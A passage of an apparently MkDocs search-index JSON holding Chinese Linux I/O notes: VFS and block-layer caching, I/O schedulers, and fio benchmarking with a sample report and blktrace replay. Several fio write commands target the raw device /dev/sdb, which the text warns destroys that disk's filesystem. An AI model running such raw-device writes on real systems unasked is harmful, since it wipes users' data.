\u76ee\u5f55\u6811\u4e2d\u7684\u67d0\u4e2a\u5b50\u76ee\u5f55\uff08\u79f0\u4e3a\u6302\u8f7d\u70b9\uff09\uff0c\u7136\u540e\u624d\u80fd\u8bbf\u95ee\u5176\u4e2d\u7684\u6587\u4ef6\u3002\u62ff\u7b2c\u4e00\u7c7b\uff0c\u4e5f\u5c31\u662f\u57fa\u4e8e\u78c1\u76d8\u7684\u6587\u4ef6\u7cfb\u7edf\u4e3a\u4f8b\uff0c\u5728\u5b89\u88c5\u7cfb\u7edf\u65f6\uff0c\u8981\u5148\u6302\u8f7d\u4e00\u4e2a\u6839\u76ee\u5f55\uff08/\uff09\uff0c\u5728\u6839\u76ee\u5f55\u4e0b\u518d\u628a\u5176\u4ed6\u6587\u4ef6\u7cfb\u7edf\uff08\u6bd4\u5982\u5176\u4ed6\u7684\u78c1\u76d8\u5206\u533a\u3001/proc \u6587\u4ef6\u7cfb\u7edf\u3001/sys \u6587\u4ef6\u7cfb\u7edf\u3001NFS \u7b49\uff09\u6302\u8f7d\u8fdb\u6765\u3002 \u7f13\u5b58\uff1a\u4e3a\u4e86\u534f\u8c03\u5feb\u901fCPU\u53ca\u6162\u901f\u78c1\u76d8\u4e4b\u95f4\u7684\u6027\u80fd\u5dee\u5f02\uff0cLINUX\u6587\u4ef6\u7cfb\u7edf\u901a\u8fc7\u5404\u79cd\u7f13\u5b58\u5b9e\u73b0\u6587\u4ef6\u7684\u5feb\u901f\u8bbf\u95ee\uff0c\u4e3b\u8981\u5305\u62ec\uff1a \u9875\u7f13\u5b58\uff1a\u7f13\u5b58\u4e86\u865a\u62df\u5185\u5b58\u9875\u9762\uff0c\u5176\u4e2d\u5305\u62ec\u4e86\u6587\u4ef6\u7cfb\u7edf\u7684\u9875\u9762\uff0c\u63d0\u5347\u4e86\u6587\u4ef6\u548c\u76ee\u5f55\u7684\u6027\u80fd\uff0c\u5f53\u7cfb\u7edf\u7cfb\u7edf\u5185\u5b58\u4e0d\u8db3\u65f6\uff0c\u9875\u7f13\u5b58\u662f\u53ef\u4ee5\u56de\u6536\u7684\uff0c\u53ef\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\uff1agrep \"Cached\" /proc/meminfo \u67e5\u770b\u7cfb\u7edf\u9875\u7f13\u5b58\u5927\u5c0f \u76ee\u5f55\u9879\u7f13\u5b58\uff1adentry\u8bb0\u5f55\u4e86\u4ece\u76ee\u5f55\u9879\u5230VFS inode\u7684\u6620\u5c04\u5173\u7cfb\uff0c\u63d0\u9ad8\u4e86\u8def\u5f84\u540d\u67e5\u627e\u7684\u6027\u80fd\uff0c \u53ef\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\uff1a grep \"dentry\" /proc/slabinfo \u67e5\u770b\u7cfb\u7edf\u76ee\u5f55\u9879\u7f13\u5b58\u5927\u5c0f \u7d22\u5f15\u8282\u70b9\u7f13\u5b58\uff1a inode_cache\u7f13\u5b58\u7684\u5bf9\u8c61\u662finode\uff0c\u5305\u62ec\u6587\u4ef6\u8bbf\u95ee\u6743\u9650\u3001\u66f4\u65b0\u65f6\u95f4\u6233\u3001\u6587\u4ef6\u5927\u5c0f\u7b49\u4fe1\u606f\uff0c\u53ef\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\uff1agrep \"inode_cache\" /proc/slabinfo\u67e5\u770b\u7d22\u5f15\u8282\u70b9\u7f13\u5b58\u5927\u5c0f \u6587\u4ef6\u7f13\u5b58\u662f\u8fd9\u4e48\u8ba1\u7b97\u7684 /proc/meminfo\u4e2d 11 Active(file): 728232 kB 12 Inactive(file): 400104 kB \u8fd9\u4e24\u4e2a\u503c\u5f97\u603b\u548c","title":"\u865a\u62df\u6587\u4ef6\u7cfb\u7edf\u7ea7\u7f13\u5b58"},{"location":"system/linux/IO/IO%E6%8A%80%E6%9C%AF%E6%A0%88/#io_1","text":"\u5728linux\u7cfb\u7edf\u4e2d\u78c1\u76d8\u662f\u4f5c\u4e3a\u4e00\u4e2a\u5757\u8bbe\u5907\u6765\u7ba1\u7406\u7684\uff0c\u4ee5\u5757\u4e3a\u5355\u4f4d\u8bfb\u5199\u6570\u636e\uff0c\u4e3a\u4e86\u51cf\u5c11\u4e0d\u540c\u7684\u5757\u8bbe\u5907\u5dee\u5f02\u5e26\u6765\u7684\u5f71\u54cd\uff0c\u7c7b\u4f3c\u865a\u62df\u6587\u4ef6\u7cfb\u7edfVFS\uff0clinux\u901a\u8fc7\u4e00\u4e2a\u7edf\u4e00\u7684\u901a\u7528\u5757\u5c42\u6765\u7ba1\u7406\u5404\u79cd\u5757\u8bbe\u5907\uff0c\u4e3b\u8981\u529f\u80fd\u5982\u4e0b\uff1a \u4e3a\u6587\u4ef6\u7cfb\u7edf\u548c\u5e94\u7528\u7a0b\u5e8f\uff0c\u63d0\u4f9b\u8bbf\u95ee\u5757\u8bbe\u5907\u7684\u6807\u51c6\u63a5\u53e3\uff0c\u5c06\u5404\u79cd\u78c1\u76d8\u8bbe\u5907\u62bd\u8c61\u4e3a\u7edf\u4e00\u7684\u5757\u8bbe\u5907\u6765\u7ba1\u7406 \u5bf9I/O\u8bf7\u6c42\u8fdb\u884c\u8c03\u5ea6\uff0c\u901a\u8fc7\u91cd\u65b0\u6392\u5e8f\uff0c\u8bf7\u6c42\u5408\u5e76\u7b49\u63aa\u65bd\u4f18\u5316\u78c1\u76d8\u8bfb\u5199\u6548\u7387 I/O\u8c03\u5ea6\u5668\u5bf9I/O\u8bf7\u6c42\u8fdb\u884c\u6392\u5e8f\uff0c\u5177\u4f53\u7531\u91c7\u7528\u7684\u8c03\u5ea6\u7b56\u7565\u51b3\u5b9a\uff0c\u4e3b\u8981\u7b56\u7565\u5982\u4e0b None\uff1a\u4e0d\u505a\u4efb\u4f55\u8c03\u5ea6\uff0c\u5e38\u7528\u4e8e\u865a\u62df\u673a\uff0c\u78c1\u76d8I/O\u8c03\u5ea6\u53d6\u51b3\u4e86\u5bbf\u4e3b\u7269\u7406\u673a\u7b56\u7565 Noop\uff1a\u4e00\u4e2a\u5148\u5165\u5148\u51fa\u7684\u961f\u5217\uff0c\u53ea\u505a\u4e00\u4e9b\u57fa\u672c\u7684\u8bf7\u6c42\u5408\u5e76\uff0c\u9002\u7528\u4e8eSSD\u78c1\u76d8 Deadline\uff1a\u4e3a\u6bcf\u4e2aI/O\u8bf7\u6c42\u5ef6\u65f6\u8bbe\u5b9a\u622a\u6b62\u65f6\u95f4\uff0c\u5c06\u8981\u8fbe\u5230\u622a\u6b62\u65f6\u95f4\u7684\u8bf7\u6c42\u88ab\u4f18\u5148\u5904\u7406\uff0c\u5171\u4f7f\u7528\u4e09\u4e2a\u961f\u5217\uff1a\u8bfbFIFO\u3001\u5199FIFO\u548c\u6392\u5e8f\u961f\u5217\uff0c\u901a\u5e38\u9002\u7528\u4e8eI/O\u6c42\u60c5\u5927\u91cf\u7684\u4e1a\u52a1\uff0c\u6bd4\u5982\u6570\u636e\u5e93 Cfq\uff1a\u5b8c\u5168\u516c\u5e73\u961f\u5217\u8c03\u5ea6\u628aI/O\u65f6\u95f4\u7247\u5206\u914d\u7ed9\u8fdb\u7a0b\uff0c\u786e\u4fdd\u78c1\u76d8\u8d44\u6e90\u7684\u516c\u5e73\u4f7f\u7528\uff0c\u901a\u5e38\u4f5c\u4e3a\u9ed8\u8ba4\u9009\u9879\uff0c\u53ef\u901a\u8fc7ionice\u547d\u4ee4\u5bf9\u7528\u6237\u8fdb\u7a0b\u8bbe\u5b9a\u4f18\u5148\u7ea7\u548c\u7c7b\u522b","title":"\u78c1\u76d8IO"},{"location":"system/linux/IO/IO%E6%8C%87%E6%A0%87%E5%8F%8A%E5%B7%A5%E5%85%B7/","text":"IO\u6307\u6807\u53ca\u5de5\u5177","title":"IO\u6307\u6807\u53ca\u5de5\u5177"},{"location":"system/linux/IO/IO%E6%8C%87%E6%A0%87%E5%8F%8A%E5%B7%A5%E5%85%B7/#io","text":"","title":"IO\u6307\u6807\u53ca\u5de5\u5177"},{"location":"system/linux/IO/IO%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/","text":"fio fio\uff08Flexible I/O Tester\uff09\u6b63\u662f\u6700\u5e38\u7528\u7684\u6587\u4ef6\u7cfb\u7edf\u548c\u78c1\u76d8 I/O \u6027\u80fd\u57fa\u51c6\u6d4b\u8bd5\u5de5\u5177\u3002\u5b83\u63d0\u4f9b\u4e86\u5927\u91cf\u7684\u53ef\u5b9a\u5236\u5316\u9009\u9879\uff0c\u53ef\u4ee5\u7528\u6765\u6d4b\u8bd5\uff0c\u88f8\u76d8\u6216\u8005\u6587\u4ef6\u7cfb\u7edf\u5728\u5404\u79cd\u573a\u666f\u4e0b\u7684 I/O \u6027\u80fd\uff0c\u5305\u62ec\u4e86\u4e0d\u540c\u5757\u5927\u5c0f\u3001\u4e0d\u540c I/O \u5f15\u64ce\u4ee5\u53ca\u662f\u5426\u4f7f\u7528\u7f13\u5b58\u7b49\u573a\u666f # CentOS yum install -y fio libaio-dev fio \u7684\u9009\u9879\u975e\u5e38\u591a\uff0c \u6211\u4f1a\u901a\u8fc7\u51e0\u4e2a\u5e38\u89c1\u573a\u666f\u7684\u6d4b\u8bd5\u65b9\u6cd5\uff0c\u4ecb\u7ecd\u4e00\u4e9b\u6700\u5e38\u7528\u7684\u9009\u9879\u3002\u8fd9\u4e9b\u5e38\u89c1\u573a\u666f\u5305\u62ec\u968f\u673a\u8bfb\u3001\u968f\u673a\u5199\u3001\u987a\u5e8f\u8bfb\u4ee5\u53ca\u987a\u5e8f\u5199\u7b49\uff0c\u4f60\u53ef\u4ee5\u6267\u884c\u4e0b\u9762\u8fd9\u4e9b\u547d\u4ee4\u6765\u6d4b\u8bd5\uff1a # \u968f\u673a\u8bfb fio -name=randread -direct=1 -iodepth=64 -rw=randread -ioengine=libaio -bs=4k -size=1G -numjobs=1 -runtime=1000 -group_reporting -filename=/dev/sdb # \u968f\u673a\u5199 fio -name=randwrite -direct=1 -iodepth=64 -rw=randwrite -ioengine=libaio -bs=4k -size=1G -numjobs=1 -runtime=1000 -group_reporting -filename=/dev/sdb # \u987a\u5e8f\u8bfb fio -name=read -direct=1 -iodepth=64 -rw=read -ioengine=libaio -bs=4k -size=1G -numjobs=1 -runtime=1000 -group_reporting -filename=/dev/sdb # \u987a\u5e8f\u5199 fio -name=write -direct=1 -iodepth=64 -rw=write -ioengine=libaio -bs=4k -size=1G -numjobs=1 -runtime=1000 -group_reporting -filename=/dev/sdb direct\uff0c\u8868\u793a\u662f\u5426\u8df3\u8fc7\u7cfb\u7edf\u7f13\u5b58\u3002\u4e0a\u9762\u793a\u4f8b\u4e2d\uff0c\u6211\u8bbe\u7f6e\u7684 1 \uff0c\u5c31\u8868\u793a\u8df3\u8fc7\u7cfb\u7edf\u7f13\u5b58\u3002 iodepth\uff0c\u8868\u793a\u4f7f\u7528\u5f02\u6b65 I/O\uff08asynchronous I/O\uff0c\u7b80\u79f0 AIO\uff09\u65f6\uff0c\u540c\u65f6\u53d1\u51fa\u7684 I/O \u8bf7\u6c42\u4e0a\u9650\u3002\u5728\u4e0a\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u6211\u8bbe\u7f6e\u7684\u662f 64\u3002 rw\uff0c\u8868\u793a I/O \u6a21\u5f0f\u3002\u6211\u7684\u793a\u4f8b\u4e2d\uff0c read/write \u5206\u522b\u8868\u793a\u987a\u5e8f\u8bfb / \u5199\uff0c\u800c randread/randwrite \u5219\u5206\u522b\u8868\u793a\u968f\u673a\u8bfb / \u5199\u3002 ioengine\uff0c\u8868\u793a I/O \u5f15\u64ce\uff0c\u5b83\u652f\u6301\u540c\u6b65\uff08sync\uff09\u3001\u5f02\u6b65\uff08libaio\uff09\u3001\u5185\u5b58\u6620\u5c04\uff08mmap\uff09\u3001\u7f51\u7edc\uff08net\uff09\u7b49\u5404\u79cd I/O \u5f15\u64ce\u3002\u4e0a\u9762\u793a\u4f8b\u4e2d\uff0c\u6211\u8bbe\u7f6e\u7684 libaio \u8868\u793a\u4f7f\u7528\u5f02\u6b65 I/O\u3002 bs\uff0c\u8868\u793a I/O \u7684\u5927\u5c0f\u3002\u793a\u4f8b\u4e2d\uff0c\u6211\u8bbe\u7f6e\u6210\u4e86 4K\uff08\u8fd9\u4e5f\u662f\u9ed8\u8ba4\u503c\uff09\u3002 filename\uff0c\u8868\u793a\u6587\u4ef6\u8def\u5f84\uff0c\u5f53\u7136\uff0c\u5b83\u53ef\u4ee5\u662f\u78c1\u76d8\u8def\u5f84\uff08\u6d4b\u8bd5\u78c1\u76d8\u6027\u80fd\uff09\uff0c\u4e5f\u53ef\u4ee5\u662f\u6587\u4ef6\u8def\u5f84\uff08\u6d4b\u8bd5\u6587\u4ef6\u7cfb\u7edf\u6027\u80fd\uff09\u3002\u793a\u4f8b\u4e2d\uff0c\u6211\u628a\u5b83\u8bbe\u7f6e\u6210\u4e86\u78c1\u76d8 /dev/sdb\u3002\u4e0d\u8fc7\u6ce8\u610f\uff0c\u7528\u78c1\u76d8\u8def\u5f84\u6d4b\u8bd5\u5199\uff0c\u4f1a\u7834\u574f\u8fd9\u4e2a\u78c1\u76d8\u4e2d\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u6240\u4ee5\u5728\u4f7f\u7528\u524d\uff0c\u4f60\u4e00\u5b9a\u8981\u4e8b\u5148\u505a\u597d\u6570\u636e\u5907\u4efd\u3002 runtime fifo\u8fd0\u884c\u65f6\u957f group_reporting \u591a\u4e2ajob\u5e76\u53d1\u65f6\uff0c\u6253\u5370\u6574\u4e2agroup\u7684\u7edf\u8ba1\u503c name job\u7684\u540d\u5b57 size IO\u6d4b\u8bd5\u7684\u5bfb\u5740\u7a7a\u95f4 \u4e0b\u9762\u5c31\u662f\u6211\u4f7f\u7528 fio \u6d4b\u8bd5\u987a\u5e8f\u8bfb\u7684\u4e00\u4e2a\u62a5\u544a\u793a\u4f8b\u3002 read: (g=0): rw=read, bs=(R) 4096B-4096B, (W) 4096B-4096B, (T) 4096B-4096B, ioengine=libaio, iodepth=64 fio-3.1 Starting 1 process Jobs: 1 (f=1): [R(1)][100.0%][r=16.7MiB/s,w=0KiB/s][r=4280,w=0 IOPS][eta 00m:00s] read: (groupid=0, jobs=1): err= 0: pid=17966: Sun Dec 30 08:31:48 2018 read: IOPS=4257, BW=16.6MiB/s (17.4MB/s)(1024MiB/61568msec) slat (usec): min=2, max=2566, avg= 4.29, stdev=21.76 clat (usec): min=228, max=407360, avg=15024.30, stdev=20524.39 lat (usec): min=243, max=407363, avg=15029.12, stdev=20524.26 clat percentiles (usec): | 1.00th=[ 498], 5.00th=[ 1020], 10.00th=[ 1319], 20.00th=[ 1713], | 30.00th=[ 1991], 40.00th=[ 2212], 50.00th=[ 2540], 60.00th=[ 2933], | 70.00th=[ 5407], 80.00th=[ 44303], 90.00th=[ 45351], 95.00th=[ 45876], | 99.00th=[ 46924], 99.50th=[ 46924], 99.90th=[ 48497], 99.95th=[ 49021], | 99.99th=[404751] bw ( KiB/s): min= 8208, max=18832, per=99.85%, avg=17005.35, stdev=998.94, samples=123 iops : min= 2052, max= 4708, avg=4251.30, stdev=249.74, samples=123 lat (usec) : 250=0.01%, 500=1.03%, 750=1.69%, 1000=2.07% lat (msec) : 2=25.64%, 4=37.58%, 10=2.08%, 20=0.02%, 50=29.86% lat (msec) : 100=0.01%, 500=0.02% cpu : usr=1.02%, sys=2.97%, ctx=33312, majf=0, minf=75 IO depths : 1=0.1%, 2=0.1%, 4=0.1%, 8=0.1%, 16=0.1%, 32=0.1%, >=64=100.0% submit : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, >=64=0.0% complete : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.1%, >=64=0.0% issued rwt: total=262144,0,0, short=0,0,0, dropped=0,0,0 latency : target=0, window=0, percentile=100.00%, depth=64 Run status group 0 (all jobs): READ: bw=16.6MiB/s (17.4MB/s), 16.6MiB/s-16.6MiB/s (17.4MB/s-17.4MB/s), io=1024MiB (1074MB), run=61568-61568msec Disk stats (read/write): sdb: ios=261897/0, merge=0/0, ticks=3912108/0, in_queue=3474336, util=90.09% \u8fd9\u4e2a\u62a5\u544a\u4e2d\uff0c\u9700\u8981\u6211\u4eec\u91cd\u70b9\u5173\u6ce8\u7684\u662f\uff0c slat\u3001clat\u3001lat \uff0c\u4ee5\u53ca bw \u548c iops \u8fd9\u51e0\u884c\u3002 \u5148\u6765\u770b\u521a\u521a\u63d0\u5230\u7684\u524d\u4e09\u4e2a\u53c2\u6570\u3002\u4e8b\u5b9e\u4e0a\uff0cslat\u3001clat\u3001lat \u90fd\u662f\u6307 I/O \u5ef6\u8fdf\uff08latency\uff09\u3002\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\uff1a slat \uff0c\u662f\u6307\u4ece I/O \u63d0\u4ea4\u5230\u5b9e\u9645\u6267\u884c I/O \u7684\u65f6\u957f\uff08Submission latency\uff09\uff1b clat \uff0c\u662f\u6307\u4ece I/O \u63d0\u4ea4\u5230 I/O \u5b8c\u6210\u7684\u65f6\u957f\uff08Completion latency\uff09\uff1b lat \uff0c\u6307\u7684\u662f\u4ece fio \u521b\u5efa I/O \u5230 I/O \u5b8c\u6210\u7684\u603b\u65f6\u957f\u3002 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5bf9\u540c\u6b65 I/O \u6765\u8bf4\uff0c\u7531\u4e8e I/O \u63d0\u4ea4\u548c I/O \u5b8c\u6210\u662f\u4e00\u4e2a\u52a8\u4f5c\uff0c\u6240\u4ee5 slat \u5b9e\u9645\u4e0a\u5c31\u662f I/O \u5b8c\u6210\u7684\u65f6\u95f4\uff0c\u800c clat \u662f 0\u3002\u800c\u4ece\u793a\u4f8b\u53ef\u4ee5\u770b\u5230\uff0c\u4f7f\u7528\u5f02\u6b65 I/O\uff08libaio\uff09\u65f6\uff0clat \u8fd1\u4f3c\u7b49\u4e8e slat + clat \u4e4b\u548c\u3002 bw \uff0c\u5b83\u4ee3\u8868\u541e\u5410\u91cf\u3002\u5728\u6211\u4e0a\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u4f60\u53ef\u4ee5\u770b\u5230\uff0c\u5e73\u5747\u541e\u5410\u91cf\u5927\u7ea6\u662f 16 MB\uff0817005 KiB/1024\uff09\u3002 iops \uff0c\u5176\u5b9e\u5c31\u662f\u6bcf\u79d2 I/O \u7684\u6b21\u6570\uff0c\u4e0a\u9762\u793a\u4f8b\u4e2d\u7684\u5e73\u5747 IOPS \u4e3a 4250\u3002 \u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u5e94\u7528\u7a0b\u5e8f\u7684 I/O \u90fd\u662f\u8bfb\u5199\u5e76\u884c\u7684\uff0c\u800c\u4e14\u6bcf\u6b21\u7684 I/O \u5927\u5c0f\u4e5f\u4e0d\u4e00\u5b9a\u76f8\u540c\u3002\u6240\u4ee5\uff0c\u521a\u521a\u8bf4\u7684\u8fd9\u51e0\u79cd\u573a\u666f\uff0c\u5e76\u4e0d\u80fd\u7cbe\u786e\u6a21\u62df\u5e94\u7528\u7a0b\u5e8f\u7684 I/O \u6a21\u5f0f\u3002\u90a3\u600e\u4e48\u624d\u80fd\u7cbe\u786e\u6a21\u62df\u5e94\u7528\u7a0b\u5e8f\u7684 I/O \u6a21\u5f0f\u5462\uff1f \u5e78\u8fd0\u7684\u662f\uff0cfio \u652f\u6301 I/O \u7684\u91cd\u653e\u3002\u501f\u52a9\u524d\u9762\u63d0\u5230\u8fc7\u7684 blktrace\uff0c\u518d\u914d\u5408\u4e0a fio\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u5bf9\u5e94\u7528\u7a0b\u5e8f I/O \u6a21\u5f0f\u7684\u57fa\u51c6\u6d4b\u8bd5\u3002\u4f60\u9700\u8981\u5148\u7528 blktrace \uff0c\u8bb0\u5f55\u78c1\u76d8\u8bbe\u5907\u7684 I/O \u8bbf\u95ee\u60c5\u51b5\uff1b\u7136\u540e\u4f7f\u7528 fio \uff0c\u91cd\u653e blktrace \u7684\u8bb0\u5f55\u3002 # \u4f7f\u7528blktrace\u8ddf\u8e2a\u78c1\u76d8I/O\uff0c\u6ce8\u610f\u6307\u5b9a\u5e94\u7528\u7a0b\u5e8f\u6b63\u5728\u64cd\u4f5c\u7684\u78c1\u76d8 $ blktrace /dev/sdb # \u67e5\u770bblktrace\u8bb0\u5f55\u7684\u7ed3\u679c # ls sdb.blktrace.0 sdb.blktrace.1 # \u5c06\u7ed3\u679c\u8f6c\u5316\u4e3a\u4e8c\u8fdb\u5236\u6587\u4ef6 $ blkparse sdb -d sdb.bin # \u4f7f\u7528fio\u91cd\u653e\u65e5\u5fd7 $ fio --name=replay --filename=/dev/sdb --direct=1 --read_iolog=sdb.bin \u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u901a\u8fc7 blktrace+fio \u7684\u7ec4\u5408\u4f7f\u7528\uff0c\u5f97\u5230\u4e86\u5e94\u7528\u7a0b\u5e8f I/O \u6a21\u5f0f\u7684\u57fa\u51c6\u6d4b\u8bd5\u62a5\u544a\u3002","title":"IO\u6d4b\u8bd5\u65b9\u6cd5"},{"location":"system/linux/IO/IO%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/#fio","text":"fio\uff08Flexible I/O Tester\uff09\u6b63\u662f\u6700\u5e38\u7528\u7684\u6587\u4ef6\u7cfb\u7edf\u548c\u78c1\u76d8 I/O \u6027\u80fd\u57fa\u51c6\u6d4b\u8bd5\u5de5\u5177\u3002\u5b83\u63d0\u4f9b\u4e86\u5927\u91cf\u7684\u53ef\u5b9a\u5236\u5316\u9009\u9879\uff0c\u53ef\u4ee5\u7528\u6765\u6d4b\u8bd5\uff0c\u88f8\u76d8\u6216\u8005\u6587\u4ef6\u7cfb\u7edf\u5728\u5404\u79cd\u573a\u666f\u4e0b\u7684 I/O \u6027\u80fd\uff0c\u5305\u62ec\u4e86\u4e0d\u540c\u5757\u5927\u5c0f\u3001\u4e0d\u540c I/O \u5f15\u64ce\u4ee5\u53ca\u662f\u5426\u4f7f\u7528\u7f13\u5b58\u7b49\u573a\u666f # CentOS yum install -y fio libaio-dev fio \u7684\u9009\u9879\u975e\u5e38\u591a\uff0c \u6211\u4f1a\u901a\u8fc7\u51e0\u4e2a\u5e38\u89c1\u573a\u666f\u7684\u6d4b\u8bd5\u65b9\u6cd5\uff0c\u4ecb\u7ecd\u4e00\u4e9b\u6700\u5e38\u7528\u7684\u9009\u9879\u3002\u8fd9\u4e9b\u5e38\u89c1\u573a\u666f\u5305\u62ec\u968f\u673a\u8bfb\u3001\u968f\u673a\u5199\u3001\u987a\u5e8f\u8bfb\u4ee5\u53ca\u987a\u5e8f\u5199\u7b49\uff0c\u4f60\u53ef\u4ee5\u6267\u884c\u4e0b\u9762\u8fd9\u4e9b\u547d\u4ee4\u6765\u6d4b\u8bd5\uff1a # \u968f\u673a\u8bfb fio -name=randread -direct=1 -iodepth=64 -rw=randread -ioengine=libaio -bs=4k -size=1G -numjobs=1 -runtime=1000 -group_reporting -filename=/dev/sdb # \u968f\u673a\u5199 fio -name=randwrite -direct=1 -iodepth=64 -rw=randwrite -ioengine=libaio -bs=4k -size=1G -numjobs=1 -runtime=1000 -group_reporting -filename=/dev/sdb # \u987a\u5e8f\u8bfb fio -name=read -direct=1 -iodepth=64 -rw=read -ioengine=libaio -bs=4k -size=1G -numjobs=1 -runtime=1000 -group_reporting -filename=/dev/sdb # \u987a\u5e8f\u5199 fio -name=write -direct=1 -iodepth=64 -rw=write -ioengine=libaio -bs=4k -size=1G -numjobs=1 -runtime=1000 -group_reporting -filename=/dev/sdb direct\uff0c\u8868\u793a\u662f\u5426\u8df3\u8fc7\u7cfb\u7edf\u7f13\u5b58\u3002\u4e0a\u9762\u793a\u4f8b\u4e2d\uff0c\u6211\u8bbe\u7f6e\u7684 1 \uff0c\u5c31\u8868\u793a\u8df3\u8fc7\u7cfb\u7edf\u7f13\u5b58\u3002 iodepth\uff0c\u8868\u793a\u4f7f\u7528\u5f02\u6b65 I/O\uff08asynchronous I/O\uff0c\u7b80\u79f0 AIO\uff09\u65f6\uff0c\u540c\u65f6\u53d1\u51fa\u7684 I/O \u8bf7\u6c42\u4e0a\u9650\u3002\u5728\u4e0a\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u6211\u8bbe\u7f6e\u7684\u662f 64\u3002 rw\uff0c\u8868\u793a I/O \u6a21\u5f0f\u3002\u6211\u7684\u793a\u4f8b\u4e2d\uff0c read/write \u5206\u522b\u8868\u793a\u987a\u5e8f\u8bfb / \u5199\uff0c\u800c randread/randwrite \u5219\u5206\u522b\u8868\u793a\u968f\u673a\u8bfb / \u5199\u3002 ioengine\uff0c\u8868\u793a I/O \u5f15\u64ce\uff0c\u5b83\u652f\u6301\u540c\u6b65\uff08sync\uff09\u3001\u5f02\u6b65\uff08libaio\uff09\u3001\u5185\u5b58\u6620\u5c04\uff08mmap\uff09\u3001\u7f51\u7edc\uff08net\uff09\u7b49\u5404\u79cd I/O \u5f15\u64ce\u3002\u4e0a\u9762\u793a\u4f8b\u4e2d\uff0c\u6211\u8bbe\u7f6e\u7684 libaio \u8868\u793a\u4f7f\u7528\u5f02\u6b65 I/O\u3002 bs\uff0c\u8868\u793a I/O \u7684\u5927\u5c0f\u3002\u793a\u4f8b\u4e2d\uff0c\u6211\u8bbe\u7f6e\u6210\u4e86 4K\uff08\u8fd9\u4e5f\u662f\u9ed8\u8ba4\u503c\uff09\u3002 filename\uff0c\u8868\u793a\u6587\u4ef6\u8def\u5f84\uff0c\u5f53\u7136\uff0c\u5b83\u53ef\u4ee5\u662f\u78c1\u76d8\u8def\u5f84\uff08\u6d4b\u8bd5\u78c1\u76d8\u6027\u80fd\uff09\uff0c\u4e5f\u53ef\u4ee5\u662f\u6587\u4ef6\u8def\u5f84\uff08\u6d4b\u8bd5\u6587\u4ef6\u7cfb\u7edf\u6027\u80fd\uff09\u3002\u793a\u4f8b\u4e2d\uff0c\u6211\u628a\u5b83\u8bbe\u7f6e\u6210\u4e86\u78c1\u76d8 /dev/sdb\u3002\u4e0d\u8fc7\u6ce8\u610f\uff0c\u7528\u78c1\u76d8\u8def\u5f84\u6d4b\u8bd5\u5199\uff0c\u4f1a\u7834\u574f\u8fd9\u4e2a\u78c1\u76d8\u4e2d\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u6240\u4ee5\u5728\u4f7f\u7528\u524d\uff0c\u4f60\u4e00\u5b9a\u8981\u4e8b\u5148\u505a\u597d\u6570\u636e\u5907\u4efd\u3002 runtime fifo\u8fd0\u884c\u65f6\u957f group_reporting \u591a\u4e2ajob\u5e76\u53d1\u65f6\uff0c\u6253\u5370\u6574\u4e2agroup\u7684\u7edf\u8ba1\u503c name job\u7684\u540d\u5b57 size IO\u6d4b\u8bd5\u7684\u5bfb\u5740\u7a7a\u95f4 \u4e0b\u9762\u5c31\u662f\u6211\u4f7f\u7528 fio \u6d4b\u8bd5\u987a\u5e8f\u8bfb\u7684\u4e00\u4e2a\u62a5\u544a\u793a\u4f8b\u3002 read: (g=0): rw=read, bs=(R) 4096B-4096B, (W) 4096B-4096B, (T) 4096B-4096B, ioengine=libaio, iodepth=64 fio-3.1 Starting 1 process Jobs: 1 (f=1): [R(1)][100.0%][r=16.7MiB/s,w=0KiB/s][r=4280,w=0 IOPS][eta 00m:00s] read: (groupid=0, jobs=1): err= 0: pid=17966: Sun Dec 30 08:31:48 2018 read: IOPS=4257, BW=16.6MiB/s (17.4MB/s)(1024MiB/61568msec) slat (usec): min=2, max=2566, avg= 4.29, stdev=21.76 clat (usec): min=228, max=407360, avg=15024.30, stdev=20524.39 lat (usec): min=243, max=407363, avg=15029.12, stdev=20524.26 clat percentiles (usec): | 1.00th=[ 498], 5.00th=[ 1020], 10.00th=[ 1319], 20.00th=[ 1713], | 30.00th=[ 1991], 40.00th=[ 2212], 50.00th=[ 2540], 60.00th=[ 2933], | 70.00th=[ 5407], 80.00th=[ 44303], 90.00th=[ 45351], 95.00th=[ 45876], | 99.00th=[ 46924], 99.50th=[ 46924], 99.90th=[ 48497], 99.95th=[ 49021], | 99.99th=[404751] bw ( KiB/s): min= 8208, max=18832, per=99.85%, avg=17005.35, stdev=998.94, samples=123 iops : min= 2052, max= 4708, avg=4251.30, stdev=249.74, samples=123 lat (usec) : 250=0.01%, 500=1.03%, 750=1.69%, 1000=2.07% lat (msec) : 2=25.64%, 4=37.58%, 10=2.08%, 20=0.02%, 50=29.86% lat (msec) : 100=0.01%, 500=0.02% cpu : usr=1.02%, sys=2.97%, ctx=33312, majf=0, minf=75 IO depths : 1=0.1%, 2=0.1%, 4=0.1%, 8=0.1%, 16=0.1%, 32=0.1%, >=64=100.0% submit : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, >=64=0.0% complete : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.1%, >=64=0.0% issued rwt: total=262144,0,0, short=0,0,0, dropped=0,0,0 latency : target=0, window=0, percentile=100.00%, depth=64 Run status group 0 (all jobs): READ: bw=16.6MiB/s (17.4MB/s), 16.6MiB/s-16.6MiB/s (17.4MB/s-17.4MB/s), io=1024MiB (1074MB), run=61568-61568msec Disk stats (read/write): sdb: ios=261897/0, merge=0/0, ticks=3912108/0, in_queue=3474336, util=90.09% \u8fd9\u4e2a\u62a5\u544a\u4e2d\uff0c\u9700\u8981\u6211\u4eec\u91cd\u70b9\u5173\u6ce8\u7684\u662f\uff0c 